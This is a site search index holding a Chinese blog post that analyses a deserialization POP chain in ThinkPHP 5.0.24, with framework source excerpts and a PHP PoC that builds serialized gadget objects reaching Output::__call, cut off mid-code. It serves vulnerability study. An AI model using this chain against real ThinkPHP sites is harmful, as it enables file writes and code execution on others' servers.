<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>TP5.0.24反序列化漏洞分析</title>
      <link href="/2383120768.html"/>
      <url>/2383120768.html</url>
      
        <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>最近再看一个TP二次开发的框架，发现TP5.0.24版本存在一个反序列化，就拿来分析学习一下，由于windows路径的问题，这个漏洞只能在linux才能getshell，所以改了下POC只做分析。</p><h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>首先创建一个unserialize用来触发反序列化</p><pre class=" language-php"><code class="language-php">    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">index2</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>        <span class="token keyword">echo</span> <span class="token string">"Welcome thinkphp 5.0.24"</span><span class="token punctuation">;</span>        <span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token function">base64_decode</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'a'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p>整条POP链有点长，我分开看，先看第一部分</p><p><img src="/2383120768/3.png" alt></p><p>第一部分的目标就是到这个__call函数处，然后以此继续进行下面的攻击，我们运行给出的POC，看一下调用栈。</p><p><img src="/2383120768/4.png" alt></p><p>从上面的调用栈，整个前半部分的流程就很清晰了，我们跟进去一个个的看一下。首先是反序列化入口__destruct，通过实例化windows类来触发，没什么好说的，跟进removeFiles()</p><p><img src="/2383120768/1.png" alt></p><p><img src="/2383120768/2.png" alt></p><p>我们调用栈中可以看到这个地方是通过file_exists函数触发了__toString。__toString是反序列化中比较常见的用来做跳板的魔术方法。<code>当一个对象被当做字符串使用时触发</code>，我们看一下file_exists的定义</p><p><img src="/2383120768/5.png" alt></p><p>可以看到，他会把$filename当作字符串看待，所以当$filename是一个实例时就会触发$filename-&gt;__toString()。所以这个地方我们就要去找含有可利用的__toString的类，然后跳过去进行下一步。POC中利用的Model中的__toString方法，但是由于Model是抽象类，所以只能去找他的子类进行利用，找到两个，分别是Pivot,和Merge这个POC中利用的是前者，后面会单独每个类写一个POC。</p><p><img src="/2383120768/6.png" alt></p><p>继续跟进toJson</p><p><img src="/2383120768/7.png" alt></p><p>toJson方法中调用了toArray方法，都没什么好说的，我们再继续跟，后面就是到了toArray</p><p><img src="/2383120768/8.png" alt></p><p>在toArray方法中寻找函数调用，其实不止这一个的，其他的我们后面在进行分析，先把整个POP链捋一遍。</p><p>我们先看运行到<code>$item[$key] = $value ? $value-&gt;getAttr($attr) : null;</code>的条件：</p><pre class=" language-php"><code class="language-php">需要满足：<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">empty</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">append</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span> <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">method_exists</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token punctuation">,</span> <span class="token variable">$relation</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span> <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">method_exists</span><span class="token punctuation">(</span><span class="token variable">$modelRelation</span><span class="token punctuation">,</span> <span class="token string">'getBindAttr'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span> <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$bindAttr</span><span class="token punctuation">)</span>且不能满足：<span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span> <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">is_array</span><span class="token punctuation">(</span><span class="token variable">$name</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">)</span> <span class="token keyword">elseif</span> <span class="token punctuation">(</span><span class="token function">strpos</span><span class="token punctuation">(</span><span class="token variable">$name</span><span class="token punctuation">,</span> <span class="token string">'.'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token number">7</span><span class="token punctuation">)</span> <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">data</span><span class="token punctuation">[</span><span class="token variable">$key</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span></code></pre><p>$append变量可控，我们可以直接绕过(1)(5)(6)</p><p><img src="/2383120768/D:%5CXXAQ%5CBlog%5CJoker%5Csource%5C_posts%5CTP5-0-24%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%5C9.png" alt></p><p>我们再看(2)，检查方法是否存在，由于$relation是由$name控制，而$name又是$append数组中的值，所以$relation我们是可控的，而$relation的值又关系到$modelRelation，所以$modlRelation中必须含有getBindAttr方法，所以$relation就必须是Model类中的一个返回值可控的方法，用来进入到有getBindAttr方法的类中。这些POC都给我们找好了，就是Model中的getError方法。</p><p><img src="/2383120768/10.png" alt></p><p>其中error变量可控，接下来就是找有getBindAttr方法的类，只有一个就是OneToOne类，同样是抽象类，继续去找他的子类，找到Belongs和HasOne，到这里(2)(3)也都满足了，再看最后的4，7</p><p><img src="/2383120768/11.png" alt></p><p><img src="/2383120768/12.png" alt></p><p>可以看到getBindAttr可控，所以bindAttr是可以控制的</p><p>而$this-&gt;date[]则默认就是空的。到此，就可以进入到</p><pre class=" language-php"><code class="language-php"><span class="token variable">$item</span><span class="token punctuation">[</span><span class="token variable">$key</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token variable">$value</span> <span class="token operator">?</span> <span class="token variable">$value</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">getAttr</span><span class="token punctuation">(</span><span class="token variable">$attr</span><span class="token punctuation">)</span> <span class="token punctuation">:</span> <span class="token keyword">null</span><span class="token punctuation">;</span></code></pre><p>我们看一下$value的值</p><pre class=" language-php"><code class="language-php"><span class="token variable">$value</span>         <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">getRelationData</span><span class="token punctuation">(</span><span class="token variable">$modelRelation</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p>跟进getRelationData看一下，在这里$modelRelation的值是OneToOne的子类</p><pre class=" language-php"><code class="language-php">    <span class="token keyword">protected</span> <span class="token keyword">function</span> <span class="token function">getRelationData</span><span class="token punctuation">(</span>Relation <span class="token variable">$modelRelation</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token keyword">parent</span> <span class="token operator">&amp;&amp;</span> <span class="token operator">!</span><span class="token variable">$modelRelation</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">isSelfRelation</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token function">get_class</span><span class="token punctuation">(</span><span class="token variable">$modelRelation</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">getModel</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token function">get_class</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token keyword">parent</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token variable">$value</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token keyword">parent</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>            <span class="token comment" spellcheck="true">// 首先获取关联数据</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">method_exists</span><span class="token punctuation">(</span><span class="token variable">$modelRelation</span><span class="token punctuation">,</span> <span class="token string">'getRelation'</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                <span class="token variable">$value</span> <span class="token operator">=</span> <span class="token variable">$modelRelation</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">getRelation</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>                <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">BadMethodCallException</span><span class="token punctuation">(</span><span class="token string">'method not exists:'</span> <span class="token punctuation">.</span> <span class="token function">get_class</span><span class="token punctuation">(</span><span class="token variable">$modelRelation</span><span class="token punctuation">)</span> <span class="token punctuation">.</span> <span class="token string">'-> getRelation'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>        <span class="token punctuation">}</span>        <span class="token keyword">return</span> <span class="token variable">$value</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span></code></pre><p>找到可控点：</p><pre class=" language-php"><code class="language-php"><span class="token variable">$value</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token keyword">parent</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//parent的值我们是可以控制的，所以我们可以利用这个点对$value的值进行控制</span></code></pre><p>我们看一下if的条件，parent可控，这个肯定满足，跟进看``isSelfRelation`</p><p><img src="/2383120768/13.png" alt></p><p>selfRelation可控，所以我们可以直接传回false，再看后面，需要让$modelRelation和$this-&gt;parent的类相同跟进getModel，看是否有利用的地方，此处我们可以继续进行以此函数调用</p><p><img src="/2383120768/14.png" alt></p><p>我们利用的Query中的getModel继续跟进</p><p><img src="/2383120768/15.png" alt></p><p>跳到了Query类中，而且此时model可控。到此位置我们就完成了$value的可控，利用这个我们其实就可以跳到任意一个__call方法中。</p><p>我们看一下Output类中的__call方法：</p><pre class=" language-php"><code class="language-php">    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__call</span><span class="token punctuation">(</span><span class="token variable">$method</span><span class="token punctuation">,</span> <span class="token variable">$args</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">in_array</span><span class="token punctuation">(</span><span class="token variable">$method</span><span class="token punctuation">,</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">styles</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token function">array_unshift</span><span class="token punctuation">(</span><span class="token variable">$args</span><span class="token punctuation">,</span> <span class="token variable">$method</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">return</span> <span class="token function">call_user_func_array</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token variable">$this</span><span class="token punctuation">,</span> <span class="token string">'block'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token variable">$args</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//利用点</span>        <span class="token punctuation">}</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">handle</span> <span class="token operator">&amp;&amp;</span> <span class="token function">method_exists</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">handle</span><span class="token punctuation">,</span> <span class="token variable">$method</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">return</span> <span class="token function">call_user_func_array</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">handle</span><span class="token punctuation">,</span> <span class="token variable">$method</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token variable">$args</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>            <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">Exception</span><span class="token punctuation">(</span><span class="token string">'method not exists:'</span> <span class="token punctuation">.</span> <span class="token constant">__CLASS__</span> <span class="token punctuation">.</span> <span class="token string">'->'</span> <span class="token punctuation">.</span> <span class="token variable">$method</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span></code></pre><p>我们可以看到还需要我们的$method在$this-&gt;styles中，styles是可空的，所以这个地方还需要将getAttr方法写进去。</p><p>下面是到__call方法的POC，其实一共可以扩展成4条:</p><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token keyword">namespace</span> <span class="token package">think<span class="token punctuation">\</span>console</span> <span class="token punctuation">{</span>    <span class="token keyword">class</span> <span class="token class-name">Output</span>    <span class="token punctuation">{</span>        <span class="token keyword">protected</span> <span class="token variable">$styles</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>            <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">styles</span><span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'getAttr'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">namespace</span> <span class="token package">think<span class="token punctuation">\</span>model<span class="token punctuation">\</span>relation</span> <span class="token punctuation">{</span>    <span class="token keyword">use</span> <span class="token package">think<span class="token punctuation">\</span>db<span class="token punctuation">\</span>Query</span><span class="token punctuation">;</span>    <span class="token keyword">abstract</span> <span class="token keyword">class</span> <span class="token class-name">OneToOne</span>    <span class="token punctuation">{</span>    <span class="token punctuation">}</span>    <span class="token keyword">class</span> <span class="token class-name">HasOne</span> <span class="token keyword">extends</span> <span class="token class-name">OneToOne</span><span class="token comment" spellcheck="true">//此处同样可以使用Belongs类</span>    <span class="token punctuation">{</span>        <span class="token keyword">protected</span> <span class="token variable">$selfRelation</span><span class="token punctuation">;</span>        <span class="token keyword">protected</span> <span class="token variable">$query</span><span class="token punctuation">;</span>        <span class="token keyword">protected</span> <span class="token variable">$bindAttr</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token punctuation">{</span>            <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">query</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Query</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">selfRelation</span> <span class="token operator">=</span> <span class="token boolean">false</span><span class="token punctuation">;</span>            <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">bindAttr</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'no'</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token string">'no'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">namespace</span> <span class="token package">think</span> <span class="token punctuation">{</span>    <span class="token keyword">abstract</span> <span class="token keyword">class</span> <span class="token class-name">Model</span>    <span class="token punctuation">{</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">namespace</span> <span class="token package">think<span class="token punctuation">\</span>db</span> <span class="token punctuation">{</span>    <span class="token keyword">use</span> <span class="token package">think<span class="token punctuation">\</span>console<span class="token punctuation">\</span>Output</span><span class="token punctuation">;</span>    <span class="token keyword">class</span> <span class="token class-name">Query</span>    <span class="token punctuation">{</span>        <span class="token keyword">protected</span> <span class="token variable">$model</span><span class="token punctuation">;</span>        <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token punctuation">{</span>            <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">model</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Output</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">namespace</span> <span class="token package">think<span class="token punctuation">\</span>model</span> <span class="token punctuation">{</span>    <span class="token keyword">use</span> <span class="token package">think<span class="token punctuation">\</span>console<span class="token punctuation">\</span>Output</span><span class="token punctuation">;</span>    <span class="token keyword">use</span> <span class="token package">think<span class="token punctuation">\</span>Model</span><span class="token punctuation">;</span>    <span class="token keyword">use</span> <span class="token package">think<span class="token punctuation">\</span>model<span class="token punctuation">\</span>relation<span class="token punctuation">\</span>HasOne</span><span class="token punctuation">;</span>    <span class="token keyword">abstract</span> <span class="token keyword">class</span> <span class="token class-name">Relation</span>    <span class="token punctuation">{</span>    <span class="token punctuation">}</span>    <span class="token keyword">class</span> <span class="token class-name">Pivot</span> <span class="token keyword">extends</span> <span class="token class-name">Model</span>    <span class="token punctuation">{</span>        <span class="token keyword">public</span> <span class="token variable">$parent</span><span class="token punctuation">;</span>        <span class="token keyword">protected</span> <span class="token variable">$append</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token keyword">protected</span> <span class="token variable">$error</span><span class="token punctuation">;</span>        <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token punctuation">{</span>            <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token keyword">parent</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Output</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//调用__call的类</span>            <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">append</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">"getError"</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token string">"getError"</span><span class="token punctuation">]</span><span class="token punctuation">;</span>            <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">error</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">HasOne</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">namespace</span> <span class="token package">think<span class="token punctuation">\</span>process<span class="token punctuation">\</span>pipes</span> <span class="token punctuation">{</span>    <span class="token keyword">use</span> <span class="token package">think<span class="token punctuation">\</span>Model<span class="token punctuation">\</span>Pivot</span><span class="token punctuation">;</span>    <span class="token keyword">abstract</span> <span class="token keyword">class</span> <span class="token class-name">Pipes</span>    <span class="token punctuation">{</span>    <span class="token punctuation">}</span>    <span class="token keyword">class</span> <span class="token class-name">Windows</span> <span class="token keyword">extends</span> <span class="token class-name">Pipes</span>    <span class="token punctuation">{</span>        <span class="token keyword">private</span> <span class="token variable">$files</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token punctuation">{</span>            <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">files</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token keyword">new</span> <span class="token class-name">Pivot</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//此处同样可以使用Merge类</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">namespace</span> <span class="token punctuation">{</span>    <span class="token keyword">use</span> <span class="token package">think<span class="token punctuation">\</span>process<span class="token punctuation">\</span>pipes<span class="token punctuation">\</span>Windows</span><span class="token punctuation">;</span>    <span class="token keyword">echo</span> <span class="token function">base64_encode</span><span class="token punctuation">(</span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">Windows</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p>到此我们就成功的进入到了__call方法中，我们看后续如何利用。</p><p>利用的是<code>call_user_func_array()</code>回调函数去调用block,args我们是可控的，我们去看block方法</p><p><img src="/2383120768/16.png" alt></p><p>调用writrln继续跟进</p><p><img src="/2383120768/17.png" alt></p><p>在跟进write</p><p><img src="/2383120768/18.png" alt></p><p>这个地方handle可控，所以我们可以继续函数调用跳到另一个类的write当中，这个漏洞利用的是/thinkphp/library/think/session/driver/Memcached.php类中的write方法</p><p><img src="/2383120768/19.png" alt></p><p>这个地方的handler依然可控，所以我们可以继续利用set跳，下面就是进入到了/thinkphp/library/think/cache/driver/File.php类中的set方法</p><pre class=" language-php"><code class="language-php">    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">set</span><span class="token punctuation">(</span><span class="token variable">$name</span><span class="token punctuation">,</span> <span class="token variable">$value</span><span class="token punctuation">,</span> <span class="token variable">$expire</span> <span class="token operator">=</span> <span class="token keyword">null</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">is_null</span><span class="token punctuation">(</span><span class="token variable">$expire</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token variable">$expire</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">options</span><span class="token punctuation">[</span><span class="token string">'expire'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$expire</span> <span class="token keyword">instanceof</span> <span class="token class-name"><span class="token punctuation">\</span>DateTime</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token variable">$expire</span> <span class="token operator">=</span> <span class="token variable">$expire</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">getTimestamp</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token function">time</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token variable">$filename</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">getCacheKey</span><span class="token punctuation">(</span><span class="token variable">$name</span><span class="token punctuation">,</span> <span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">tag</span> <span class="token operator">&amp;&amp;</span> <span class="token operator">!</span><span class="token function">is_file</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token variable">$first</span> <span class="token operator">=</span> <span class="token boolean">true</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token variable">$data</span> <span class="token operator">=</span> <span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$value</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">options</span><span class="token punctuation">[</span><span class="token string">'data_compress'</span><span class="token punctuation">]</span> <span class="token operator">&amp;&amp;</span> <span class="token function">function_exists</span><span class="token punctuation">(</span><span class="token string">'gzcompress'</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token comment" spellcheck="true">//数据压缩</span>            <span class="token variable">$data</span> <span class="token operator">=</span> <span class="token function">gzcompress</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token variable">$data</span>   <span class="token operator">=</span> "<span class="token delimiter">&lt;?php</span>\<span class="token package">n</span><span class="token comment" spellcheck="true">//" . sprintf('%012d', $expire) . "\n exit();?>\n" . $data;</span>        <span class="token variable">$result</span> <span class="token operator">=</span> <span class="token function">file_put_contents</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">,</span> <span class="token variable">$data</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$result</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$first</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">setTagItem</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token function">clearstatcache</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">return</span> <span class="token boolean">true</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>            <span class="token keyword">return</span> <span class="token boolean">false</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span></code></pre><p>可以看到在这个地方有file_put_contents，先看文件名是否可控</p><pre class=" language-php"><code class="language-php"><span class="token keyword">protected</span> <span class="token keyword">function</span> <span class="token function">getCacheKey</span><span class="token punctuation">(</span><span class="token variable">$name</span><span class="token punctuation">,</span> <span class="token variable">$auto</span> <span class="token operator">=</span> <span class="token boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token variable">$name</span> <span class="token operator">=</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$name</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">options</span><span class="token punctuation">[</span><span class="token string">'cache_subdir'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token comment" spellcheck="true">// 使用子目录</span>        <span class="token variable">$name</span> <span class="token operator">=</span> <span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$name</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">)</span> <span class="token punctuation">.</span> <span class="token constant">DS</span> <span class="token punctuation">.</span> <span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$name</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">options</span><span class="token punctuation">[</span><span class="token string">'prefix'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token variable">$name</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">options</span><span class="token punctuation">[</span><span class="token string">'prefix'</span><span class="token punctuation">]</span> <span class="token punctuation">.</span> <span class="token constant">DS</span> <span class="token punctuation">.</span> <span class="token variable">$name</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token variable">$filename</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">options</span><span class="token punctuation">[</span><span class="token string">'path'</span><span class="token punctuation">]</span> <span class="token punctuation">.</span> <span class="token variable">$name</span> <span class="token punctuation">.</span> <span class="token string">'.php'</span><span class="token punctuation">;</span>    <span class="token variable">$dir</span>      <span class="token operator">=</span> <span class="token function">dirname</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$auto</span> <span class="token operator">&amp;&amp;</span> <span class="token operator">!</span><span class="token function">is_dir</span><span class="token punctuation">(</span><span class="token variable">$dir</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token function">mkdir</span><span class="token punctuation">(</span><span class="token variable">$dir</span><span class="token punctuation">,</span> <span class="token number">0755</span><span class="token punctuation">,</span> <span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">return</span> <span class="token variable">$filename</span><span class="token punctuation">;</span><span class="token 